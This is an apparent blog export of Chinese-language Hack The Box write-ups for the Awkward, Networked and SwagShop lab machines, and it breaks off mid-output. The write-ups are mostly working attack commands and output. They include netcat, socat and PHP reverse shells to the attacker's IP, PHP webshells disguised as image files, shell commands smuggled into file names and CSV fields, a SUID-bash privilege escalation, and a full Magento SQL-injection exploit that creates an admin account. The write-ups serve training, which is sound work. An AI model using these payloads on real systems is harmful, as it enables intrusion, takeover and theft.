4444\n```\n然后接着我们将产品添加到购物车\n\n![](Hackthebox-Awkward/KYqHRotuHTuY2rpPIxX8gqZRLC1495Wsi3qTqpLcWxs.png)\n\n然后修改一下参数，加入下面的参数\n\n```bash\n1/'+-e+\"1e+/tmp/shell.sh\"+/tmp/shell.sh+'\n```\n然后我们需要修改在 /cart 中创建的文件，不幸的是我们没有操作权限，所以我们选择删除这个文件，然后自己创建一个\n\n```bash\nbean@awkward:/var/www/store/cart$ ls\nb1b9-7006-2d9-74bc\nbean@awkward:/var/www/store/cart$ cp b1b9-7006-2d9-74bc bak\nbean@awkward:/var/www/store/cart$ rm -rf b1b9-7006-2d9-74bc \nbean@awkward:/var/www/store/cart$ cp bak b1b9-7006-2d9-74bc\nbean@awkward:/var/www/store/cart$ vi b1b9-7006-2d9-74bc \nbean@awkward:/var/www/store/cart$ cat b1b9-7006-2d9-74bc \n***Hat Valley Cart***\nitem_id=1' -e \"1e /tmp/shell.sh\" /tmp/shell.sh '&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90\n```\n然后我们抓一个删除商品的包\n\n![](Hackthebox-Awkward/3oUIuzXPTBfkS_5VW2BUWSPDKeieNH2Wtx79zXp1ouE.png)\n\n![](Hackthebox-Awkward/c2kb5YS27NqycwXtnWllo20DaFGqjJTSp7368GOkJ8Y.png)\n\n修改好以后执行\n\n这边拿到的是 www-data 的权限\n\n去执行一下 pspy\n\n当有新的请假请求的时候，会调用 mail 命令拼接对应 csv 文件中的 name\n\n```bash\n2023/03/12 05:12:09 CMD: UID=0     PID=74503  | mail -s Leave Request: christopher.jones christine\n```\n```bash\nwww-data@awkward:/tmp$ cat exploit.sh\n#!/bin/bash\nchmod +s /bin/bash\n\nwww-data@awkward:/tmp$ chmod 777 exploit\n\nwww-data@awkward:/tmp$ cd /var/www/private\n\nwww-data@awkward:~/private$ echo '\" --exec=\"\\!/tmp/exploit.sh\"' >> leave_requests.csv\n<\" --exec=\"\\!/tmp/exploit.sh\"' >> leave_requests.csv\nwww-data@awkward:~/private$ ls -la /bin/bash\n\nls -la /bin/bash\n-rwsr-sr-x 1 root root 1396520 Jan  7  2022 /bin/bash\n```\n```bash\nwww-data@awkward:~/private$ /bin/bash -p\n/bin/bash -p\nwhoami&&id\nroot\nuid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)\n```\n成功提权到 root 权限\n\n```bash\ncat /root/root.txt\n5d3d649dfbaf5f418cdca5f79012eafa\n```\n成功拿到 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Networked - Hackthebox","url":"/2023/03/06/Hackthebox/Easy/Hackthebox-Networked/","content":"\n# Hackthebox - Networked\n# 靶场信息\n![](Hackthebox-Networked/oBIU1gxoGcT7rKwveVIwwFp3AxJa4y_sbYfvQNrxIE8.png)\n\n# 靶场类型\n![](Hackthebox-Networked/1zzbuFS-Q-N-9g9YwHuhjBtk9JEKz6A4S-36f86DeuA.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 10000 10.10.10.146 \nStarting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 19:52 CST\nNmap scan report for 10.10.10.146\nHost is up (0.11s latency).\nNot shown: 65513 filtered tcp ports (no-response), 19 filtered tcp ports (host-prohibited)\nPORT    STATE  SERVICE VERSION\n22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)\n| ssh-hostkey: \n|   2048 2275d7a74f81a7af5266e52744b1015b (RSA)\n|   256 2d6328fca299c7d435b9459a4b38f9c8 (ECDSA)\n|_  256 73cda05b84107da71c7c611df554cfc4 (ED25519)\n80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)\n|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\n443/tcp closed https\nAggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 5.1 (92%), Linux 3.2 - 4.9 (91%), Linux 3.13 (90%), Linux 4.10 (90%), Linux 4.4 (90%), Linux 3.10 (90%), Linux 3.11 - 3.12 (90%), Linux 3.18 (90%), Linux 3.2 (90%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 443/tcp)\nHOP RTT       ADDRESS\n1   87.93 ms  10.10.16.1\n2   132.57 ms 10.10.10.146\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 27.97 seconds\n```\n## Http\n![](Hackthebox-Networked/7hLi1hKGhdeSNbzZRf4ozBzqTrwN3YTDFJU2BqMnEgI.png)\n\n似乎是说这个网站还在做，我们去做个 fuzz 看看\n\n## Fuzz\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# ffuf -u \"http://10.10.10.146/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.10.146/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 200\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n________________________________________________\n\n                        [Status: 200, Size: 229, Words: 33, Lines: 9, Duration: 89ms]\nuploads                 [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 9426ms]\nbackup                  [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 88ms]\n:: Progress: [30000/30000] :: Job [1/1] :: 2217 req/sec :: Duration: [0:00:22] :: Errors: 2 ::\n```\n有两个文件夹，一个 uploads，一个 backup\n\n![](Hackthebox-Networked/WnVZHga434P3n7tK6oeYlrwtQ17T_CP_-hJ7gatltUA.png)\n\n有一个备份文件，下载后解压看看\n\n```bash\n┌──(root㉿kali)-[~/Desktop/backup]\n└─# ls -la\n总计 36\ndrwxr-xr-x 2 root root  4096  2月26日 00:52 .\ndrwxr-xr-x 3 root root  4096  2月26日 00:51 ..\n-rw-r--r-- 1 root root 10240 2019年 7月 9日 backup.tar\n-rw-r--r-- 1 root root   229  2月26日 00:52 index.php\n-rw-r--r-- 1 root root  2001  2月26日 00:52 lib.php\n-rw-r--r-- 1 root root  1871  2月26日 00:52 photos.php\n-rw-r--r-- 1 root root  1331  2月26日 00:52 upload.php\n```\n这边可以看到有几个文件，大概的逻辑可以理清了\n\n通过 upload 上传文件，通过 photos 查看图片\n\n```bash\n    //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile[\"name\"];\n    list ($foo,$ext) = getnameUpload($myFile[\"name\"]);\n    $validext = array('.jpg', '.png', '.gif', '.jpeg');\n    $valid = false;\n    foreach ($validext as $vext) {\n      if (substr_compare($myFile[\"name\"], $vext, -strlen($vext)) === 0) {\n        $valid = true;\n```\n通过审计 upload.php 文件的代码，发现有白名单限制，只能上传 `.jpg` 、`png` 、`.gif` 、`.jpeg` 四个格式的文件\n\n# 漏洞利用\n```bash\n┌──(root㉿kali)-[~/Desktop/backup]\n└─# ls\n1.jpg  backup.tar  index.php  lib.php  photos.php  upload.php\n                                                                                                                                                                                                                   \n┌──(root㉿kali)-[~/Desktop/backup]\n└─# cat 2.php  \nphp -r '$sock=fsockopen(getenv(\"10.10.16.3\"),getenv(\"4444\"));exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n```\n准备一张图片和一个 php 来制作 shell\n\n```bash\necho '<?php' >> 1.jpg\necho 'passthru(\"whoami\");' >> 1.jpg\necho '?>' >> 1.jpg\nmv 1.jpg 1.php.jpg\n```\n![](Hackthebox-Networked/iuXWC5PuphfeCDYtW1g0VhFoYcT6VItUSdsgqkDzAyU.png)\n\n成功上传\n\n![](Hackthebox-Networked/L82sn7aAA4tcYa_tavcnntukULCt4arL7sadFib1cb0.png)\n\n可以看到我们上传的文件\n\n![](Hackthebox-Networked/Ksd4LTBvu4otPgud7vAfbOQbJalE2wsbxDO4GOEEBOA.png)\n\n确实被执行了，权限是 apache，我们去制作一下反弹的 shell\n\n```bash\nmv 1.jpg shell.php.jpg\necho '<?php' >> shell.php.jpg\necho 'passthru(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.3 4444 >/tmp/f\");' >> shell.php.jpg\necho '?>' >> shell.php.jpg\nnc -nvlp 4444\n```\n然后去上传\n\n```bash\n┌──(root㉿kali)-[~/Desktop/backup]\n└─# rlwrap nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.16.3] from (UNKNOWN) [10.10.10.146] 59222\nsh: no job control in this shell\nsh-4.2$ whoami&&id\nwhoami&&id\napache\nuid=48(apache) gid=48(apache) groups=48(apache)\n```\n成功拿到 shell\n\n# 权限提升\n## User\n```bash\nsh-4.2$ ls -la\nls -la\ntotal 28\ndrwxr-xr-x. 2 guly guly 4096 Sep  6 15:57 .\ndrwxr-xr-x. 3 root root   18 Jul  2  2019 ..\nlrwxrwxrwx. 1 root root    9 Sep  7 13:05 .bash_history -> /dev/null\n-rw-r--r--. 1 guly guly   18 Oct 30  2018 .bash_logout\n-rw-r--r--. 1 guly guly  193 Oct 30  2018 .bash_profile\n-rw-r--r--. 1 guly guly  231 Oct 30  2018 .bashrc\n-r--r--r--. 1 root root  782 Oct 30  2018 check_attack.php\n-rw-r--r--  1 root root   44 Oct 30  2018 crontab.guly\n-r--------. 1 guly guly   33 Mar  6 12:51 user.txt\n```\n在 `/home` 下有一个用户 `guly` \n\n然后在用户 `guly` 中有几个可读文件，挨个查看一下\n\n```bash\nsh-4.2$ cat check_attack.php\n\ncat check_attack.php\n<?php\nrequire '/var/www/html/lib.php';\n$path = '/var/www/html/uploads/';\n$logpath = '/tmp/attack.log';\n$to = 'guly';\n$msg= '';\n$headers = \"X-Mailer: check_attack.php\\r\\n\";\n\n$files = array();\n$files = preg_grep('/^([^.])/', scandir($path));\n\nforeach ($files as $key => $value) {\n        $msg='';\n  if ($value == 'index.html') {\n        continue;\n  }\n  #echo \"-------------\\n\";\n\n  #print \"check: $value\\n\";\n  list ($name,$ext) = getnameCheck($value);\n  $check = check_ip($name,$value);\n\n  if (!($check[0])) {\n    echo \"attack!\\n\";\n    # todo: attach file\n    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);\n\n    exec(\"rm -f $logpath\");\n    exec(\"nohup /bin/rm -f $path$value > /dev/null 2>&1 &\");\n    echo \"rm -f $path$value\\n\";\n    mail($to, $msg, $msg, $headers, \"-F$value\");\n  }\n}\n\n?>\n```\n```bash\nsh-4.2$ cat crontab.guly\ncat crontab.guly\n*/3 * * * * php /home/guly/check_attack.php\n```\n从 crontab.guly 里可以看到，每三分钟会执行一次 check\\_attack.php\n\n这里会引入一个库文件 `/var/www/html/lib.php` \n\n但是可惜的是，我们没有权限修改它\n\n但是有一个点我发现是可控的，上传文件夹中的文件名(\\$value)是可控的\n\n那么首先，我们创建一个空的测试文件，并将它放入上传文件夹中\n\n```bash\ncd /var/www/html/uploads\ntouch \"test.txt\"\n```\n现在我们将“test.txt”分配给 \\$value，执行 php 脚本并查看输出\n\n```bash\nphp /home/guly/check_attack.php\n\nsh-4.2$ php /home/guly/check_attack.php\nphp /home/guly/check_attack.php\nattack!\nrm -f /var/www/html/uploads/test.txt\n```\n这表明文件名（\\$value）附加到 \"/var/www/html/uploads\" 的末尾。\n\n所以在代码中，我们可以完全控制的部分是 \"rm -f /var/www/html/uploads/test.txt\"\n\n在脚本中，我正在操控的代码是\n\n```bash\nexec(\"nohup /bin/rm -f $path$value > /dev/null 2>&1 &\");\n```\n所以我准备创建一个以分号开头并以命令结尾的文件名，来自定义执行我们的 php exec() 函数\n\n```bash\nexec(\"nohup /bin/rm -f $path ; command-to-inject > /dev/null 2>&1 &\");\n```\nok，我们正式开始\n\n```bash\ntouch \"; nc 10.10.16.3 5555 -e '/bin/bash'\"\n\nsh-4.2$ touch \"; nc 10.10.16.3 5555 -e '/bin/bash'\"\ntouch \"; nc 10.10.16.3 5555 -e '/bin/bash'\"\ntouch: cannot touch '; nc 10.10.16.3 5555 -e \\'/bin/bash\\'': No such file or directory\n```\n这边似乎用 netcat 执行比较麻烦，反斜杠的原因吧，懒得弄编码了，用 socat 试试吧\n\n```bash\nsocat file:`tty`,raw,echo=0 tcp-listen:5555\n```\n然后去创建我们的文件名\n\n```bash\ntouch \"; socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.16.3:5555\" \n```\n然后再去执行一下 php 脚本\n\n```bash\nphp /home/guly/check_attack.php\n\nsh-4.2$ php /home/guly/check_attack.php\nphp /home/guly/check_attack.php\nattack!\n/bin/rm: cannot remove '/var/www/html/uploads/': Is a directory\nrm -f /var/www/html/uploads/; socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.16.3:5555\n```\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# socat file:`tty`,raw,echo=0 tcp-listen:5555\nbash-4.2$ whoami&&id\napache\nuid=48(apache) gid=48(apache) groups=48(apache)\n```\n这边确实可以被执行，由于是我们调用的，所以还是 apache 权限，所以我们现在去让脚本自动执行吧\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# socat file:`tty`,raw,echo=0 tcp-listen:5555\n[guly@networked ~]$ whoami&&id\nguly\nuid=1000(guly) gid=1000(guly) groups=1000(guly)\n```\n成功拿到 user 权限的 flag 文件\n\n```bash\n[guly@networked ~]$ cat user.txt \nc41daff87304452dde58eae1751e49b6\n```\n成功拿到 user 权限的 flag 文件\n\n## Root\n```bash\n[guly@networked ~]$ sudo -l\nMatching Defaults entries for guly on networked:\n    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,\n    env_reset, env_keep=\"COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS\",\n    env_keep+=\"MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE\",\n    env_keep+=\"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES\",\n    env_keep+=\"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE\",\n    env_keep+=\"LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY\",\n    secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/bin\n\nUser guly may run the following commands on networked:\n    (root) NOPASSWD: /usr/local/sbin/changename.sh\n```\n可以调用 root 权限执行 `/usr/local/sbin/changename.sh` 脚本，先去看看是什么权限还有干什么的\n\n```bash\n[guly@networked ~]$ ls -la /usr/local/sbin/changename.sh\n-rwxr-xr-x 1 root root 422 Jul  8  2019 /usr/local/sbin/changename.sh\n\n[guly@networked ~]$ cat /usr/local/sbin/changename.sh\n#!/bin/bash -p\ncat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF\nDEVICE=guly0\nONBOOT=no\nNM_CONTROLLED=no\nEoF\n\nregexp=\"^[a-zA-Z0-9_\\ /-]+$\"\n\nfor var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do\n        echo \"interface $var:\"\n        read x\n        while [[ ! $x =~ $regexp ]]; do\n                echo \"wrong input, try again\"\n                echo \"interface $var:\"\n                read x\n        done\n        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly\ndone\n  \n/sbin/ifup guly0\n```\n这里找到一篇参考文章\n\n> [https://vulmon.com/exploitdetails?qidtp=maillist\\_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)\n\n这里大概意思是在执行 `/usr/local/sbin/changename.sh` 脚本后，会让我们输入四个参数，其中的 name 参数我们是可以注入命令的\n\n我们去执行\n\n```bash\n[guly@networked ~]$ sudo /usr/local/sbin/changename.sh\ninterface NAME:\ntest bash\ninterface PROXY_METHOD:\n\nwrong input, try again\ninterface PROXY_METHOD:\n\nwrong input, try again\ninterface PROXY_METHOD:\n\nwrong input, try again\ninterface PROXY_METHOD:\n\nwrong input, try again\ninterface PROXY_METHOD:\n^C\n[guly@networked ~]$ clear\nTERM environment variable not set.\n[guly@networked ~]$ \n[guly@networked ~]$ \n[guly@networked ~]$ \n[guly@networked ~]$ \n[guly@networked ~]$ \n[guly@networked ~]$ \n[guly@networked ~]$ sudo /usr/local/sbin/changename.sh\ninterface NAME:\ntest bash\ninterface PROXY_METHOD:\ntest\ninterface BROWSER_ONLY:\ntest\ninterface BOOTPROTO:\ntest\n[root@networked network-scripts]# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\n成功提权到 root 权限\n\n```bash\n[root@networked network-scripts]# cat /root/root.txt \nff05b3ceb986ab66f5728c7cb82e67de\n```\n成功获得 root 权限的 flag 文件\n\n","tags":["Hackthebox"]},{"title":"SwagShop - Hackthebox","url":"/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/","content":"\n# Hackthebox - SwagShop\n# 靶场信息\n![](Hackthebox-SwagShop/zPQUsyBqWm1oHEPbpSqzKqcrZv6oNvwoXeehhWuyVb8.png)\n\n# 靶场类型\n![](Hackthebox-SwagShop/uQuwYY2U21Yqpe5SnsAWqRDF8u961yCU_ScSxk1GN1I.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 10000 10.10.10.140\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-02-17 02:26 CST\nWarning: 10.10.10.140 giving up on port because retransmission cap hit (10).\nNmap scan report for 10.10.10.140\nHost is up (0.078s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 b6552bd24e8fa3817261379a12f624ec (RSA)\n|   256 2e30007a92f0893059c17756ad51c0ba (ECDSA)\n|_  256 4c50d5f270c5fdc4b2f0bc4220326434 (ED25519)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-title: Did not follow redirect to http://swagshop.htb/\n|_http-server-header: Apache/2.4.18 (Ubuntu)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=2/17%OT=22%CT=1%CU=30863%PV=Y%DS=2%DC=T%G=Y%TM=63EE758\nOS:B%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)OPS\nOS:(O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST1\nOS:1NW7%O6=M537ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN\nOS:(R=Y%DF=Y%T=40%W=7210%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 993/tcp)\nHOP RTT       ADDRESS\n1   117.05 ms 10.10.16.1\n2   76.51 ms  10.10.10.140\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 37.68 seconds\n```\n## Http\n这边 http 会跳转到域名 `swagshop.htb` ，去加入一个 hosts 解析\n\n```bash\necho 10.10.10.140 swagshop.htb >> /etc/hosts\n```\n![](Hackthebox-SwagShop/8dSUb1QixmVfXpeBk1mdzduFWb1_DdBqZfTm4cixWMU.png)\n\n似乎是一个商城，底部可以发现这是 2014 年版本的 Magento\n\n去搜索一下是否有漏洞\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# searchsploit magento      \n--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                   |  Path\n--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\neBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                                                                                                                     | php/webapps/38573.txt\neBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service)                                                                                          | php/webapps/38651.txt\nMagento 1.2 - '/app/code/core/Mage/Admin/Model/Session.php?login['Username']' Cross-Site Scripting                                                                               | php/webapps/32808.txt\nMagento 1.2 - '/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email' Cross-Site Scripting                                                                         | php/webapps/32809.txt\nMagento 1.2 - 'downloader/index.php' Cross-Site Scripting                                                                                                                        | php/webapps/32810.txt\nMagento < 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                                                                                                                   | php/webapps/39838.php\nMagento CE < 1.9.0.1 - (Authenticated) Remote Code Execution                                                                                                                     | php/webapps/37811.py\nMagento eCommerce - Local File Disclosure                                                                                                                                        | php/webapps/19793.txt\nMagento eCommerce - Remote Code Execution                                                                                                                                        | xml/webapps/37977.py\nMagento eCommerce CE v2.3.5-p2 - Blind SQLi                                                                                                                                      | php/webapps/50896.txt\nMagento Server MAGMI Plugin - Multiple Vulnerabilities                                                                                                                           | php/webapps/35996.txt\nMagento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                                                                                                                      | php/webapps/35052.txt\nMagento WooCommerce CardGate Payment Gateway 2.0.30 - Payment Process Bypass                                                                                                     | php/webapps/48135.php\n--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\n这边发现有一个 RCE 的漏洞\n\n# 漏洞利用\n拷贝到本地后去查看一下\n\n```bash\nimport requests\nimport base64\nimport sys\n\ntarget = \"http://target.com/\"\n\nif not target.startswith(\"http\"):\n    target = \"http://\" + target\n\nif target.endswith(\"/\"):\n    target = target[:-1]\n\ntarget_url = target + \"/admin/Cms_Wysiwyg/directive/index/\"\n\nq=\"\"\"\nSET @SALT = 'rp';\nSET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));\nSELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;\nINSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());\nINSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');\n\"\"\"\n\n\nquery = q.replace(\"\\n\", \"\").format(username=\"forme\", password=\"forme\")\npfilter = \"popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}\".format(query)\n\n# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}\nr = requests.post(target_url,\n                  data={\"___directive\": \"e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ\",\n                        \"filter\": base64.b64encode(pfilter),\n                        \"forwarded\": 1})\nif r.ok:\n    print \"WORKED\"\n    print \"Check {0}/admin with creds forme:forme\".format(target)\nelse:\n    print \"DID NOT WORK\"\n```\n```bash\nimport requests\nimport base64\nimport sys\n\ntarget = \"http://swagshop.htb/index.php\"\n\nif not target.startswith(\"http\"):\n    target = \"http://\" + target\n\nif target.endswith(\"/\"):\n    target = target[:-1]\n\ntarget_url = target + \"/admin/Cms_Wysiwyg/directive/index/\"\n\nq=\"\"\"\nSET @SALT = 'rp';\nSET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));\nSELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;\nINSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());\nINSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');\n\"\"\"\n\n\nquery = q.replace(\"\\n\", \"\").format(username=\"lucifiel\", password=\"lucifiel\")\npfilter = \"popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}\".format(query)\n\n# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}\nr = requests.post(target_url,\n                  data={\"___directive\": \"e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ\",\n                        \"filter\": base64.b64encode(pfilter),\n                        \"forwarded\": 1})\nif r.ok:\n    print \"WORKED\"\n    print \"Check {0}/admin with creds lucifiel:lucifiel\".format(target)\nelse:\n    print \"DID NOT WORK\"\n```\n根据我们需要的进行修改，将第五行的地址更改为 `http://swagshop.htb/index.php` ，将第二十四行的账号密码更改为我们需要的账号密码\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# python2 exploit.py\nWORKED\nCheck http://swagshop.htb/index.php/admin with creds lucifiel:lucifiel\n```\n然后去进行登录\n\n![](Hackthebox-SwagShop/_mfIGM68zpBpt8C6RUIHIXZv0OHVxYnqWKpbeskWGNU.png)\n\n![](Hackthebox-SwagShop/Wxh-7zmWK-HJZlaPWZxoORfY5ngcNPfGSYqGQGWNCrE.png)\n\n成功登录\n\n> [https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper](https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper)\n\n通过翻找，找到了一篇漏洞相关的文档\n\n这里依次点击 System –> Configuration –> Advanced –> Developer –> Template Settings –> Allow Symlinks\n\n然后将它设置为 yes，然后点击 save config 保存\n\n接着制作图片马\n\n```bash\necho '<?php' >> shell.php.png\necho 'passthru(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.7 4444 >/tmp/f\");'>> shell.php.png\necho '?>' >> shell.php.png\n```\n然后再依次点击 Catalog -> Manager Categories 进行上传\n\n![](Hackthebox-SwagShop/5duE0kVkyV23MlyNlnBNNaOsvQaUDspLzTR73iyTuaI.png)\n\n![](Hackthebox-SwagShop/KrCwr7krMARPPzcPFBS3yTn-KwV0kiNvNs2kBF7-Fps.png)\n\n然后去查看，会发现我们的图片已经传上去了\n\n最后一步是创建通讯模板兵注入我们的 payload\n\n点击 Newsletter -> Newsletter Templates -> Add New Template\n\n![](Hackthebox-SwagShop/ouptBGduWPH5cJU09nNCP2JeL0x5mHS5yVI7vuNpazQ.png)\n\n```bash\n{{block type='core/template' template='../../../../../../media/catalog/category/shell.php.png'}}\n```\n这是我们要填入的内容\n\n然后使用 nc 监听一个端口\n\n最后我们点击 Preview Template 预览模板\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# rlwrap nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.16.7] from (UNKNOWN) [10.10.10.140] 33206\n/bin/sh: 0: can't access tty; job control turned off\n$ whoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n得到了一个 shell\n\n```bash\npython3 -c \"import pty;pty.spawn('/bin/bash')\";\n```\n# 权限提升\n```bash\n$ sudo -l\nMatching Defaults entries for www-data on swagshop:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser www-data may run the following commands on swagshop:\n    (root) NOPASSWD: /usr/bin/vi /var/www/html/*\n```\n我们可以使用 root 权限调用 /sur/bin/vi 执行所有 /var/www/html/\\* 的文件\n\n```bash\n$ ls -la /var/www/html/\ntotal 720\ndrwxr-xr-x 12 www-data www-data   4096 Nov 12  2021 .\ndrwxr-xr-x  3 root     root       4096 Nov 12  2021 ..\n-rw-r--r--  1 www-data www-data   5667 May  7  2014 .htaccess\n-rw-r--r--  1 www-data www-data   4568 